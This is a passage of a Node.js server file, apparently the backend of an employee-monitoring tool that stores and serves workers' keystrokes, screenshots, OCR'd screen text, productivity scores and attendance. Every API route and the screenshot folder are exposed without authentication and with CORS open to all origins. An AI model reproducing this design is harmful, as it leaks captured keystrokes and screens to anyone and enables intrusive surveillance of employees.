const { Server } = require("socket.io");
const http = require("http");
const express = require("express");
const cors = require("cors");
const Database = require("better-sqlite3");
const path = require("path");
const fs = require("fs");
const Tesseract = require("tesseract.js");
const rateLimit = require("express-rate-limit");

const app = express();
app.set("trust proxy", 1);
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// --- Rate Limiting ---
// Global: 200 requests per minute per IP
const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "Too many requests, please try again later." }
});
app.use(globalLimiter);

// API routes: stricter 100 requests per minute per IP
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: "API rate limit exceeded. Try again in a minute." }
});
app.use("/api", apiLimiter);

app.use("/storage", express.static(path.join(__dirname, "storage")));
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] }, maxHttpBufferSize: 1e8, transports: ["websocket", "polling"], addTrailingSlash: false });

// --- Socket.IO connection rate limiting ---
const socketConnections = new Map(); // IP -> count
const MAX_SOCKET_CONNECTIONS_PER_IP = 10;
io.use((socket, next) => {
  const ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
  const count = socketConnections.get(ip) || 0;
  if (count >= MAX_SOCKET_CONNECTIONS_PER_IP) {
    return next(new Error("Too many socket connections from your IP"));
  }
  socketConnections.set(ip, count + 1);
  socket.on("disconnect", () => {
    const current = socketConnections.get(ip) || 1;
    if (current <= 1) socketConnections.delete(ip);
    else socketConnections.set(ip, current - 1);
  });
  next();
});

const DB_PATH = process.env.DATA_DIR ? path.join(process.env.DATA_DIR, "teram_records.db") : path.join(__dirname, "teram_records.db");
const db = new Database(DB_PATH);
db.pragma("journal_mode = WAL");
db.pragma("busy_timeout = 5000");

// Performance indexes — critical for 50K+ row tables
try {
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_activities_hostname ON activities(hostname);
    CREATE INDEX IF NOT EXISTS idx_activities_timestamp ON activities(timestamp DESC);
    CREATE INDEX IF NOT EXISTS idx_activities_hostname_ts ON activities(hostname, timestamp DESC);
    CREATE INDEX IF NOT EXISTS idx_activities_category ON activities(category);
    CREATE INDEX IF NOT EXISTS idx_activities_date ON activities(date(timestamp));
    CREATE INDEX IF NOT EXISTS idx_activities_screen ON activities(screen_path) WHERE screen_path IS NOT NULL AND screen_path != '';
    CREATE INDEX IF NOT EXISTS idx_alerts_hostname ON alerts(hostname);
    CREATE INDEX IF NOT EXISTS idx_alerts_timestamp ON alerts(timestamp DESC);
    CREATE INDEX IF NOT EXISTS idx_alerts_severity ON alerts(severity);
  `);
} catch(e) { console.log('[DB] Index creation note:', e.message); }

// REST API for Dashboard
app.get("/api/alerts", (req, res) => {
  const { severity, hostname, status, limit } = req.query;
  let where = [];
  let params = [];
  if (severity) { where.push("severity = ?"); params.push(severity); }
  if (hostname) { where.push("hostname = ?"); params.push(hostname); }
  if (status) { where.push("status = ?"); params.push(status); }
  const whereClause = where.length > 0 ? "WHERE " + where.join(" AND ") : "";
  const alerts = db.prepare(`SELECT * FROM alerts ${whereClause} ORDER BY timestamp DESC LIMIT ?`).all(...params, parseInt(limit) || 200);
  res.json(alerts);
});

// Manual Alert Creation
app.post("/api/alerts", (req, res) => {
  const { hostname, type, message, severity, targets } = req.body;
  if (!message) return res.status(400).json({ error: "Message is required" });
  const targetList = targets && targets.length > 0 ? targets : (hostname ? [hostname] : ['*']);
  const results = [];
  for (const target of targetList) {
    const result = db.prepare("INSERT INTO alerts (hostname, type, message, severity, status) VALUES (?, ?, ?, ?, 'Active')")
      .run(target === '*' ? 'ALL' : target, type || 'Manual', message, severity || 'Medium');
    results.push(result.lastInsertRowid);
    io.emit("new-alert", { hostname: target, message, severity: severity || 'Medium', type: type || 'Manual' });
  }
  res.json({ success: true, ids: results });
});

// Dismiss/Acknowledge alert
app.patch("/api/alerts/:id", (req, res) => {
  const { status } = req.body;
  const validStatuses = ['Active', 'Dismissed', 'Acknowledged', 'Resolved'];
  if (!validStatuses.includes(status)) return res.status(400).json({ error: "Invalid status" });
  db.prepare("UPDATE alerts SET status = ? WHERE id = ?").run(status, req.params.id);
  res.json({ success: true });
});

// Delete alert
app.delete("/api/alerts/:id", (req, res) => {
  db.prepare("DELETE FROM alerts WHERE id = ?").run(req.params.id);
  res.json({ success: true });
});

// Bulk dismiss alerts
app.post("/api/alerts/bulk-action", (req, res) => {
  const { ids, action } = req.body;
  if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: "IDs array required" });
  if (action === 'delete') {
    const placeholders = ids.map(() => '?').join(',');
    db.prepare(`DELETE FROM alerts WHERE id IN (${placeholders})`).run(...ids);
  } else if (action === 'dismiss') {
    const placeholders = ids.map(() => '?').join(',');
    db.prepare(`UPDATE alerts SET status = 'Dismissed' WHERE id IN (${placeholders})`).run(...ids);
  }
  res.json({ success: true });
});

app.get("/api/activities", (req, res) => {
  const activities = db.prepare("SELECT * FROM activities ORDER BY timestamp DESC LIMIT 50").all();
  res.json(activities);
});

app.get("/api/ocr-search", (req, res) => {
  const query = req.query.q;
  if (!query) return res.json([]);
  const results = db.prepare("SELECT id, hostname, username, window_title, screen_path, timestamp, ocr_text FROM activities WHERE ocr_text LIKE ? ORDER BY timestamp DESC").all(`%${query}%`);
  res.json(results);
});

app.get("/api/productivity", (req, res) => {
  const data = db.prepare(`
    SELECT strftime('%m-%d', timestamp) as day, 
           category, 
           COUNT(*) * 5 / 60.0 as hours 
    FROM activities 
    GROUP BY day, category
  `).all();
  res.json(data);
});

app.get("/api/categories", (req, res) => {
  const data = db.prepare(`
    SELECT category as name, 
           COUNT(*) as value
    FROM activities 
    GROUP BY category
  `).all();
  res.json(data);
});

app.get("/api/history", (req, res) => {
  const { hostname, date } = req.query;
  const data = db.prepare(`
    SELECT id, hostname, window_title, screen_path, timestamp, keystrokes, status 
    FROM activities 
    WHERE hostname = ? AND date(timestamp) = ?
    ORDER BY timestamp ASC
  `).all(hostname, date);
  res.json(data);
});

app.get("/api/employees", (req, res) => {
  const data = db.prepare(`
    SELECT a.hostname, a.username, a.status, MAX(a.timestamp) as lastActive, n.nickname
    FROM activities a
    LEFT JOIN nicknames n ON a.hostname = n.hostname
    GROUP BY a.hostname
    ORDER BY lastActive DESC
  `).all();
  res.json(data);
});

app.get("/api/stats", (req, res) => {
  const totalAlerts = db.prepare("SELECT COUNT(*) as count FROM alerts").get();
  const dbAgents = db.prepare("SELECT COUNT(DISTINCT hostname) as count FROM activities WHERE timestamp > datetime('now', '-5 minutes')").get();

  // Also count LIVE socket connections (agents connected right now)
  const liveAgents = Array.from(io.sockets.sockets.values()).filter(s => s.agentData && s.hostname);
  const liveCount = new Set(liveAgents.map(s => s.hostname)).size;

  // Use whichever is higher: DB count or live socket count
  const activeAgents = Math.max(dbAgents.count, liveCount);

  // Calculate a dynamic risk score (0 to 1.0)
  const criticalCount = db.prepare("SELECT COUNT(*) as count FROM alerts WHERE severity = 'High' AND timestamp > datetime('now', '-1 hour')").get().count;
  const unproductiveSeconds = db.prepare("SELECT COUNT(*) * 5 as sec FROM activities WHERE category = 'Unproductive' AND timestamp > datetime('now', '-1 hour')").get().sec;

  let riskScore = (criticalCount * 0.15) + (unproductiveSeconds / 3600 * 0.3);
  riskScore = Math.min(riskScore, 1.0).toFixed(2);

  res.json({
    totalAlerts: totalAlerts.count,
    activeAgents: activeAgents,
    riskScore: parseFloat(riskScore)
  });
});

app.get("/api/risk-score", (req, res) => {
  try {
    // Separate queries to avoid catastrophic JOIN
    const activityData = db.prepare(`
      SELECT strftime('%H:00', timestamp) as hour,
             COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) * 5 / 60 as unproductive_mins
      FROM activities
      WHERE timestamp > datetime('now', '-24 hours')
      GROUP BY hour ORDER BY hour ASC
    `).all();
    const alertData = db.prepare(`
      SELECT strftime('%H:00', timestamp) as hour,
             COUNT(*) as criticals
      FROM alerts
      WHERE severity = 'High' AND timestamp > datetime('now', '-24 hours')
      GROUP BY hour
    `).all();
    const alertMap = Object.fromEntries(alertData.map(a => [a.hour, a.criticals]));
    const hourlyData = activityData.map(a => ({
      hour: a.hour,
      criticals: alertMap[a.hour] || 0,
      unproductive_mins: a.unproductive_mins
    }));
    res.json(hourlyData);
  } catch (e) {
    console.log(`[DB] risk-score error: ${e.message}`);
    res.json([]);
  }
});

app.get("/api/policies", (req, res) => {
  const policies = db.prepare("SELECT * FROM policies ORDER BY id DESC").all();
  res.json(policies);
});

app.post("/api/policies", (req, res) => {
  const { name, type, action, status, severity, conditions, targets } = req.body;
  const stmt = db.prepare("INSERT INTO policies (name, type, action, status, severity, conditions, targets) VALUES (?, ?, ?, ?, ?, ?, ?)");
  stmt.run(name, type, action, status, severity, conditions || null, targets || null);
  io.emit("policy-update");
  res.json({ success: true });
});

app.delete("/api/policies/:id", (req, res) => {
  db.prepare("DELETE FROM policies WHERE id = ?").run(req.params.id);
  io.emit("policy-update");
  res.json({ success: true });
});

// Toggle policy status (Active/Paused)
app.patch("/api/policies/:id/toggle", (req, res) => {
  const policy = db.prepare("SELECT * FROM policies WHERE id = ?").get(req.params.id);
  if (!policy) return res.status(404).json({ error: "Not found" });
  const newStatus = policy.status === "Active" ? "Paused" : "Active";
  db.prepare("UPDATE policies SET status = ? WHERE id = ?").run(newStatus, req.params.id);
  io.emit("policy-update");
  res.json({ success: true, status: newStatus });
});

// Update a policy
app.put("/api/policies/:id", (req, res) => {
  const { name, type, action, status, severity, conditions, targets } = req.body;
  db.prepare("UPDATE policies SET name=?, type=?, action=?, status=?, severity=?, conditions=?, targets=? WHERE id=?")
    .run(name, type, action, status, severity, conditions || null, targets || null, req.params.id);
  io.emit("policy-update");
  res.json({ success: true });
});

// Agent-specific policies: returns only policies targeting this hostname (or * for all)
app.get("/api/policies/for-agent/:hostname", (req, res) => {
  const { hostname } = req.params;
  const all = db.prepare("SELECT * FROM policies WHERE status = 'Active'").all();
  const filtered = all.filter(p => {
    if (!p.targets || p.targets.trim() === '' || p.targets.trim() === '*') return true;
    const targetList = p.targets.split(',').map(t => t.trim().toLowerCase());
    return targetList.includes(hostname.toLowerCase()) || targetList.includes('*');
  });
  res.json(filtered);
});

// Active agents list (for device targeting in DLP page)
app.get("/api/active-agents", (req, res) => {
  // Combine live sockets + recent DB activity
  const liveAgents = Array.from(io.sockets.sockets.values())
    .filter(s => s.agentData && s.hostname)
    .map(s => ({ hostname: s.hostname, username: s.agentData.username, status: 'Online' }));
  const dbAgents = db.prepare(`
    SELECT a.hostname, a.username, n.nickname,
      CASE WHEN a.timestamp > datetime('now', '-5 minutes') THEN 'Online' ELSE 'Offline' END as status
    FROM activities a
    LEFT JOIN nicknames n ON a.hostname = n.hostname
    GROUP BY a.hostname
    ORDER BY MAX(a.timestamp) DESC
  `).all();
  
  // Also get nicknames for live agents that might not be in DB yet
  const nicknamesMap = new Map();
  db.prepare("SELECT hostname, nickname FROM nicknames").all().forEach(n => nicknamesMap.set(n.hostname, n.nickname));

  // Merge: prefer live status
  const merged = new Map();
  dbAgents.forEach(a => merged.set(a.hostname, a));
  liveAgents.forEach(a => {
    merged.set(a.hostname, { 
      ...merged.get(a.hostname), 
      ...a,
      nickname: nicknamesMap.get(a.hostname) || null
    });
  });
  res.json(Array.from(merged.values()));
});

app.get("/api/reports", (req, res) => {
  const reports = db.prepare("SELECT * FROM reports ORDER BY timestamp DESC").all();
  res.json(reports);
});

// Generate a real report from database data
app.post("/api/reports/generate", (req, res) => {
  const { type, period, hostname } = req.body;
  const now = new Date();
  const dateLabel = now.toISOString().split('T')[0];
  let reportData = {};
  let reportName = '';

  try {
    switch (type) {
      case 'daily-summary': {
        reportName = `Daily Summary — ${dateLabel}`;
        const totalSnaps = db.prepare("SELECT COUNT(*) as c FROM activities WHERE date(timestamp) = date('now')").get().c;
        const productive = db.prepare("SELECT COUNT(*) as c FROM activities WHERE date(timestamp) = date('now') AND category = 'Productive'").get().c;
        const unproductive = db.prepare("SELECT COUNT(*) as c FROM activities WHERE date(timestamp) = date('now') AND category = 'Unproductive'").get().c;
        const browsing = db.prepare("SELECT COUNT(*) as c FROM activities WHERE date(timestamp) = date('now') AND category = 'Browsing'").get().c;
        const alerts = db.prepare("SELECT COUNT(*) as c FROM alerts WHERE date(timestamp) = date('now')").get().c;
        const activeAgents = db.prepare("SELECT COUNT(DISTINCT hostname) as c FROM activities WHERE date(timestamp) = date('now')").get().c;
        const topApps = db.prepare(`SELECT window_title as app, category, COUNT(*) as count FROM activities WHERE date(timestamp) = date('now') GROUP BY window_title ORDER BY count DESC LIMIT 10`).all();
        const perEmployee = db.prepare(`SELECT hostname, username, COUNT(*) as snaps, COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productive, MIN(timestamp) as firstSeen, MAX(timestamp) as lastSeen FROM activities WHERE date(timestamp) = date('now') GROUP BY hostname ORDER BY snaps DESC`).all();
        reportData = { totalSnaps, productive, unproductive, browsing, alerts, activeAgents, productivityRate: totalSnaps > 0 ? Math.round(productive / totalSnaps * 100) : 0, topApps, perEmployee };
        break;
      }
      case 'security-audit': {
        reportName = `Security Audit — ${dateLabel}`;
        const totalAlerts = db.prepare("SELECT COUNT(*) as c FROM alerts WHERE timestamp > datetime('now', '-7 days')").get().c;
        const criticalAlerts = db.prepare("SELECT COUNT(*) as c FROM alerts WHERE severity = 'High' AND timestamp > datetime('now', '-7 days')").get().c;
        const dlpIncidents = db.prepare("SELECT COUNT(*) as c FROM dlp_incidents WHERE timestamp > datetime('now', '-7 days')").get().c;
        const usbEvents = db.prepare("SELECT COUNT(*) as c FROM dlp_usb_events WHERE timestamp > datetime('now', '-7 days')").get().c;
        const blockedClipboard = db.prepare("SELECT COUNT(*) as c FROM dlp_clipboard_events WHERE blocked = 1 AND timestamp > datetime('now', '-7 days')").get().c;
        const alertsByType = db.prepare("SELECT type, severity, COUNT(*) as count FROM alerts WHERE timestamp > datetime('now', '-7 days') GROUP BY type, severity ORDER BY count DESC").all();
        const riskUsers = db.prepare("SELECT hostname, username, risk_score, risk_level, total_incidents FROM dlp_user_risk WHERE risk_level IN ('High','Critical') ORDER BY risk_score DESC").all();
        const recentIncidents = db.prepare("SELECT * FROM dlp_incidents WHERE timestamp > datetime('now', '-7 days') ORDER BY timestamp DESC LIMIT 20").all();
        reportData = { totalAlerts, criticalAlerts, dlpIncidents, usbEvents, blockedClipboard, alertsByType, riskUsers, recentIncidents };
        break;
      }
      case 'team-efficiency': {
        reportName = `Team Efficiency — ${dateLabel}`;
        const employees = db.prepare(`SELECT hostname, username, COUNT(*) as totalSnaps, COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productive, COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductive, COUNT(CASE WHEN category = 'Browsing' THEN 1 END) as browsing, COUNT(DISTINCT date(timestamp)) as daysTracked, MIN(timestamp) as firstSeen, MAX(timestamp) as lastSeen FROM activities WHERE timestamp > datetime('now', '-7 days') GROUP BY hostname ORDER BY productive DESC`).all();
        const categoryBreakdown = db.prepare("SELECT category, COUNT(*) as count FROM activities WHERE timestamp > datetime('now', '-7 days') GROUP BY category").all();
        const dailyTrend = db.prepare(`SELECT date(timestamp) as day, COUNT(CASE WHEN category = 'Productive' THEN 1 END) * 5 / 60.0 as productiveHours, COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) * 5 / 60.0 as unproductiveHours FROM activities WHERE timestamp > datetime('now', '-7 days') GROUP BY day ORDER BY day`).all();
        reportData = { employees: employees.map(e => ({ ...e, productivityRate: e.totalSnaps > 0 ? Math.round(e.productive / e.totalSnaps * 100) : 0 })), categoryBreakdown, dailyTrend };
        break;
      }
      case 'time-tracking': {
        reportName = `Time Tracking — ${dateLabel}`;
        const timesheets = db.prepare(`SELECT hostname, username, date(timestamp) as day, COUNT(*) * 5 / 60.0 as totalHours, COUNT(CASE WHEN category = 'Productive' THEN 1 END) * 5 / 60.0 as productiveHours, MIN(timestamp) as clockIn, MAX(timestamp) as clockOut FROM activities WHERE timestamp > datetime('now', '-7 days') GROUP BY hostname, day ORDER BY day DESC, hostname`).all();
        const attendance = db.prepare(`SELECT hostname, username, date(timestamp) as day, MIN(time(timestamp)) as clockIn, MAX(time(timestamp)) as clockOut, ROUND((julianday(MAX(timestamp)) - julianday(MIN(timestamp))) * 24, 2) as hoursWorked FROM activities WHERE timestamp > datetime('now', '-7 days') GROUP BY hostname, day ORDER BY day DESC`).all();
        reportData = { timesheets, attendance };
        break;
      }
      default:
        return res.status(400).json({ error: 'Unknown report type' });
    }

    const reportContent = JSON.stringify(reportData);
    const sizeKB = Math.round(Buffer.byteLength(reportContent) / 1024);
    db.prepare("INSERT INTO reports (name, type, format, size, content, status) VALUES (?, ?, ?, ?, ?, 'Ready')")
      .run(reportName, type, 'JSON', `${sizeKB} KB`, reportContent);
    const lastId = db.prepare("SELECT last_insert_rowid() as id").get().id;

    res.json({ success: true, id: lastId, name: reportName, data: reportData });
  } catch (e) {
    console.error('[REPORT]', e.message);
    res.status(500).json({ error: e.message });
  }
});

// Download report as JSON
app.get("/api/reports/:id/download", (req, res) => {
  const report = db.prepare("SELECT * FROM reports WHERE id = ?").get(req.params.id);
  if (!report) return res.status(404).json({ error: 'Report not found' });
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="${report.name.replace(/[^a-z0-9]/gi, '_')}.json"`);
  res.send(report.content || '{}');
});

// Delete report
app.delete("/api/reports/:id", (req, res) => {
  db.prepare("DELETE FROM reports WHERE id = ?").run(req.params.id);
  res.json({ success: true });
});

// ═══════════════════════════════════════════════
// PHASE 2: EXPANDED INTELLIGENCE APIs
// ═══════════════════════════════════════════════

// Deep Employee Detail
app.get("/api/employee/:hostname", (req, res) => {
  const { hostname } = req.params;
  // Fast aggregated query instead of N correlated subqueries
  const employee = db.prepare(`
    SELECT hostname, username,
      (SELECT status FROM activities WHERE hostname = ? ORDER BY timestamp DESC LIMIT 1) as status,
      MAX(timestamp) as lastActive,
      COUNT(*) as totalActivities,
      COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productiveCount,
      COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductiveCount,
      COUNT(CASE WHEN category = 'Browsing' THEN 1 END) as browsingCount,
      COUNT(DISTINCT date(timestamp)) as daysTracked
    FROM activities WHERE hostname = ?
    GROUP BY hostname
  `).get(hostname, hostname);
  if (!employee) return res.status(404).json({ error: "Employee not found" });
  const totalAlerts = db.prepare("SELECT COUNT(*) as c FROM alerts WHERE hostname = ?").get(hostname)?.c || 0;
  employee.totalAlerts = totalAlerts;

  const recentActivities = db.prepare(`
    SELECT id, window_title, screen_path, category, status, timestamp, keystrokes
    FROM activities WHERE hostname = ? ORDER BY timestamp DESC LIMIT 50
  `).all(hostname);

  const recentAlerts = db.prepare(`
    SELECT * FROM alerts WHERE hostname = ? ORDER BY timestamp DESC LIMIT 20
  `).all(hostname);

  const appUsage = db.prepare(`
    SELECT window_title, category, COUNT(*) as count,
           COUNT(*) * 5 / 60.0 as minutes
    FROM activities WHERE hostname = ?
    GROUP BY window_title ORDER BY count DESC LIMIT 15
  `).all(hostname);

  const hourlyActivity = db.prepare(`
    SELECT strftime('%H', timestamp) as hour, COUNT(*) as count
    FROM activities WHERE hostname = ?
    GROUP BY hour ORDER BY hour
  `).all(hostname);

  const dailyActivity = db.prepare(`
    SELECT date(timestamp) as day, COUNT(*) as count,
           COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productive,
           COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductive
    FROM activities WHERE hostname = ?
    GROUP BY day ORDER BY day DESC LIMIT 30
  `).all(hostname);

  const total = (employee.productiveCount || 0) + (employee.unproductiveCount || 0) + (employee.browsingCount || 0);
  const productivityScore = total > 0 ? Math.round((employee.productiveCount / total) * 100) : 0;

  res.json({
    ...employee,
    productivityScore,
    recentActivities,
    recentAlerts,
    appUsage,
    hourlyActivity,
    dailyActivity
  });
});

// Timesheets: Daily/Weekly/Monthly aggregated hours per employee
app.get("/api/timesheets", (req, res) => {
  const { period = 'daily', hostname } = req.query;
  let groupFormat, dateFilter;

  switch (period) {
    case 'weekly':
      groupFormat = "strftime('%Y-W%W', timestamp)";
      dateFilter = "timestamp > datetime('now', '-60 days')";
      break;
    case 'monthly':
      groupFormat = "strftime('%Y-%m', timestamp)";
      dateFilter = "timestamp > datetime('now', '-365 days')";
      break;
    default:
      groupFormat = "date(timestamp)";
      dateFilter = "timestamp > datetime('now', '-30 days')";
  }

  let query = `
    SELECT ${groupFormat} as period, hostname, username,
           COUNT(*) * 5 / 60.0 as totalHours,
           COUNT(CASE WHEN category = 'Productive' THEN 1 END) * 5 / 60.0 as productiveHours,
           COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) * 5 / 60.0 as unproductiveHours,
           COUNT(CASE WHEN category = 'Browsing' THEN 1 END) * 5 / 60.0 as browsingHours,
           MIN(timestamp) as firstActivity,
           MAX(timestamp) as lastActivity
    FROM activities
    WHERE ${dateFilter}
    ${hostname ? 'AND hostname = ?' : ''}
    GROUP BY period, hostname
    ORDER BY period DESC, hostname
  `;

  const data = hostname
    ? db.prepare(query).all(hostname)
    : db.prepare(query).all();
  res.json(data);
});

// Activity Heatmap (GitHub-style): hourly density per day
app.get("/api/heatmap/:hostname", (req, res) => {
  const { hostname } = req.params;
  const data = db.prepare(`
    SELECT date(timestamp) as day,
           CAST(strftime('%H', timestamp) AS INTEGER) as hour,
           COUNT(*) as count
    FROM activities
    WHERE hostname = ? AND timestamp > datetime('now', '-90 days')
    GROUP BY day, hour
    ORDER BY day DESC, hour
  `).all(hostname);
  res.json(data);
});

// Global heatmap (all employees)
app.get("/api/heatmap-global", (req, res) => {
  const data = db.prepare(`
    SELECT CAST(strftime('%w', timestamp) AS INTEGER) as dayOfWeek,
           CAST(strftime('%H', timestamp) AS INTEGER) as hour,
           COUNT(*) as count
    FROM activities
    WHERE timestamp > datetime('now', '-30 days')
    GROUP BY dayOfWeek, hour
    ORDER BY dayOfWeek, hour
  `).all();
  res.json(data);
});

// App Usage Breakdown (global or per employee)
app.get("/api/app-usage", (req, res) => {
  const { hostname } = req.query;
  let query;
  if (hostname) {
    query = db.prepare(`
      SELECT window_title as app, category,
             COUNT(*) as sessions,
             COUNT(*) * 5 / 60.0 as totalMinutes,
             ROUND(COUNT(*) * 100.0 / (SELECT COUNT(*) FROM activities WHERE hostname = ?), 1) as percentage
      FROM activities WHERE hostname = ?
      GROUP BY window_title ORDER BY sessions DESC LIMIT 20
    `).all(hostname, hostname);
  } else {
    query = db.prepare(`
      SELECT window_title as app, category,
             COUNT(*) as sessions,
             COUNT(*) * 5 / 60.0 as totalMinutes,
             ROUND(COUNT(*) * 100.0 / (SELECT COUNT(*) FROM activities), 1) as percentage
      FROM activities
      GROUP BY window_title ORDER BY sessions DESC LIMIT 20
    `).all();
  }
  res.json(query);
});

// Attendance (derived from first/last activity per day + manual overrides)
app.get("/api/attendance", (req, res) => {
  const { hostname, startDate, endDate } = req.query;
  let dateFilter = "timestamp > datetime('now', '-30 days')";
  const params = [];
  if (startDate && endDate) {
    dateFilter = "date(timestamp) BETWEEN ? AND ?";
    params.push(startDate, endDate);
  }
  let query = `
    SELECT hostname, username, date(timestamp) as day,
           MIN(time(timestamp)) as clockIn,
           MAX(time(timestamp)) as clockOut,
           ROUND((julianday(MAX(timestamp)) - julianday(MIN(timestamp))) * 24, 2) as hoursWorked,
           COUNT(*) as totalSnapshots,
           COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productiveSnaps,
           COUNT(CASE WHEN status = 'Idle' OR status = 'Away' THEN 1 END) as idleSnaps
    FROM activities
    WHERE ${dateFilter}
    ${hostname ? 'AND hostname = ?' : ''}
    GROUP BY hostname, day
    ORDER BY day DESC, hostname
  `;
  if (hostname) params.push(hostname);
  const data = db.prepare(query).all(...params);

  // Merge manual overrides
  try {
    const overrides = db.prepare("SELECT * FROM attendance_overrides").all();
    const overrideMap = {};
    overrides.forEach(o => { overrideMap[`${o.hostname}_${o.day}`] = o; });
    const merged = data.map(d => {
      const key = `${d.hostname}_${d.day}`;
      const ov = overrideMap[key];
      if (ov) {
        return { ...d, clockIn: ov.clock_in || d.clockIn, clockOut: ov.clock_out || d.clockOut, hoursWorked: ov.hours_worked || d.hoursWorked, override: true, overrideNote: ov.note };
      }
      return d;
    });
    res.json(merged);
  } catch {
    res.json(data);
  }
});

// Manual attendance override
app.post("/api/attendance/override", (req, res) => {
  const { hostname, day, clock_in, clock_out, hours_worked, status, note } = req.body;
  if (!hostname || !day) return res.status(400).json({ error: "hostname and day required" });
  db.prepare(`INSERT OR REPLACE INTO attendance_overrides (hostname, day, clock_in, clock_out, hours_worked, status, note) VALUES (?,?,?,?,?,?,?)`)
    .run(hostname, day, clock_in || null, clock_out || null, hours_worked || null, status || 'Present', note || '');
  res.json({ success: true });
});

// Delete attendance override
app.delete("/api/attendance/override", (req, res) => {
  const { hostname, day } = req.query;
  if (!hostname || !day) return res.status(400).json({ error: "hostname and day required" });
  db.prepare("DELETE FROM attendance_overrides WHERE hostname = ? AND day = ?").run(hostname, day);
  res.json({ success: true });
});

// Idle vs Active Stats
app.get("/api/idle-stats", (req, res) => {
  const { hostname } = req.query;
  const whereClause = hostname ? 'WHERE hostname = ?' : '';
  const params = hostname ? [hostname] : [];

  const today = db.prepare(`
    SELECT
      COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productive,
      COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductive,
      COUNT(CASE WHEN category = 'Browsing' THEN 1 END) as browsing,
      COUNT(CASE WHEN category = 'Neutral' OR category = 'System' OR category IS NULL THEN 1 END) as idle,
      COUNT(*) as total
    FROM activities
    ${whereClause ? whereClause + " AND" : "WHERE"} date(timestamp) = date('now')
  `).get(...params);

  const weeklyTrend = db.prepare(`
    SELECT date(timestamp) as day,
      COUNT(CASE WHEN category = 'Productive' THEN 1 END) * 5 / 60.0 as productiveHours,
      COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) * 5 / 60.0 as unproductiveHours,
      COUNT(CASE WHEN category = 'Browsing' THEN 1 END) * 5 / 60.0 as browsingHours,
      COUNT(*) * 5 / 60.0 as totalHours
    FROM activities
    ${whereClause ? whereClause + " AND" : "WHERE"} timestamp > datetime('now', '-7 days')
    GROUP BY day ORDER BY day
  `).all(...params);

  res.json({ today, weeklyTrend });
});

// Employee Timeline (minute-by-minute for a specific day)
app.get("/api/employee-timeline/:hostname", (req, res) => {
  const { hostname } = req.params;
  const { date: queryDate } = req.query;
  const targetDate = queryDate || new Date().toISOString().split('T')[0];

  const timeline = db.prepare(`
    SELECT id, window_title, category, status, screen_path, timestamp,
           keystrokes, ocr_text
    FROM activities
    WHERE hostname = ? AND date(timestamp) = ?
    ORDER BY timestamp ASC
  `).all(hostname, targetDate);

  const summary = db.prepare(`
    SELECT
      COUNT(*) as totalSnaps,
      MIN(timestamp) as firstSeen,
      MAX(timestamp) as lastSeen,
      COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productive,
      COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductive,
      COUNT(DISTINCT window_title) as uniqueApps
    FROM activities
    WHERE hostname = ? AND date(timestamp) = ?
  `).get(hostname, targetDate);

  res.json({ timeline, summary, date: targetDate });
});

// Top Risk Employees
app.get("/api/top-risks", (req, res) => {
  // Separate queries to avoid catastrophic JOIN
  const activityByHost = db.prepare(`
    SELECT hostname, username,
           COUNT(*) as totalActivity,
           COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductiveCount
    FROM activities WHERE timestamp > datetime('now', '-7 days')
    GROUP BY hostname
  `).all();
  const alertsByHost = db.prepare(`
    SELECT hostname, COUNT(*) as alertCount
    FROM alerts WHERE timestamp > datetime('now', '-7 days')
    GROUP BY hostname
  `).all();
  const alertMap = Object.fromEntries(alertsByHost.map(a => [a.hostname, a.alertCount]));
  const data = activityByHost.map(a => {
    const alerts = alertMap[a.hostname] || 0;
    const riskScore = Math.round(((alerts * 0.4 + a.unproductiveCount * 0.1) / Math.max(a.totalActivity * 0.01, 1)) * 100) / 100;
    return { ...a, alertCount: alerts, riskScore };
  }).sort((a, b) => b.riskScore - a.riskScore).slice(0, 10);
  res.json(data);
});

// Dashboard Summary (enhanced stats)
app.get("/api/dashboard-summary", (req, res) => {
  const todayStats = db.prepare(`
    SELECT
      COUNT(DISTINCT hostname) as activeToday,
      COUNT(*) as totalSnapsToday,
      COUNT(CASE WHEN category = 'Productive' THEN 1 END) as productiveToday,
      COUNT(CASE WHEN category = 'Unproductive' THEN 1 END) as unproductiveToday,
      CASE WHEN COUNT(*) > 0 THEN ROUND(COUNT(CASE WHEN category = 'Productive' THEN 1 END) * 100.0 / COUNT(*), 1) ELSE 0 END as productivityRate
    FROM activities WHERE date(timestamp) = date('now')
  `).get();

  const yesterdayRate = db.prepare(`
    SELECT CASE WHEN COUNT(*) > 0 THEN ROUND(COUNT(CASE WHEN category = 'Productive' THEN 1 END) * 100.0 / COUNT(*), 1) ELSE 0 END as rate
    FROM activities WHERE date(timestamp) = date('now', '-1 day')
  `).get();

  const weeklyAlerts = db.prepare(`
    SELECT COUNT(*) as count FROM alerts WHERE timestamp > datetime('now', '-7 days')
  `).get();

  const topApp = db.prepare(`
    SELECT window_title, COUNT(*) as c FROM activities
    WHERE date(timestamp) = date('now') GROUP BY window_title ORDER BY c DESC LIMIT 1
  `).get();

  res.json({
    ...todayStats,
    yesterdayRate: yesterdayRate?.rate || 0,
